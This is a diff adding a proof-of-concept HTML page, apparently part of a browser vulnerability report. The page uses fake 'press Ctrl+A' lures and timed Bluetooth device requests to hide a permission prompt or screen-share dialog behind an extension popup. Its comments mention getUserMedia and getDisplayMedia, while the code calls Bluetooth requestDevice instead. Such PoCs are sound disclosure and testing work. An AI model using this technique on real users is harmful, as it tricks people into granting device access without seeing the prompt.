@@ -1,2 +1,63 @@
-<b>content.html</b>
-<script>location="http://www.google.com:1221";</script>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+.instructions {
+  width: 360px;
+  height: 200px;
+  background: #ddd;
+  border-radius: 0.5em;
+  padding: 1em;
+  display: none;
+}
+.show { display: block; }
+</style>
+</head>
+<body>
+<h1>PoC: Extension popup over permission prompt or screen share dialog</h1>
+
+<p>Scenarios (must change extension config): Permission prompt, Screen share</p>
+<p>To see other affected prompts, navigate to permission.site and use Ctrl+A keyboard shortcut there (or open extension popup manually).</p>
+
+<div id="instructionsPlay" class="instructions">Please press Ctrl+A to play YouTube video</div>
+<div id="instructionsShare" class="instructions">Please press Ctrl+A to share your screen on Zoom</div>
+
+<script>
+
+var isScreenShare = window.location.search.indexOf('screenshare') > -1;
+
+if (isScreenShare) {
+  instructionsShare.classList.add('show');
+} else {
+  instructionsPlay.classList.add('show');
+}
+
+window.addEventListener('keydown', (e) => {
+  // Open prompt on 'ctrl'
+  if (e.keyCode === 17) {
+    if (isScreenShare) {
+      // Secondary scenario: screen share dialog
+      // Slight delay here to reduce time where screen share dialog is visible but extension popup is still opening.
+      // If we call getDisplayMedia() *after* extension popup is opened, the extension popup is closed and attack fails.
+      setTimeout(() => {
+        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 10);
+        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 800)
+      }, 1);
+    } else {
+      // Main scenario: permission prompt
+      // Slight delay here to reduce time where permission prompt is visible but extension popup is still opening.
+      // If we call getUserMedia() *after* extension popup is opened, the permission prompt
+      // is not shown until extension prompt is closed by user.
+      setTimeout(() => {
+        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 10);
+        setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 800)
+      }, 1);
+    }
+  }
+});
+</script>
+
+</body>
+</html>
+
+
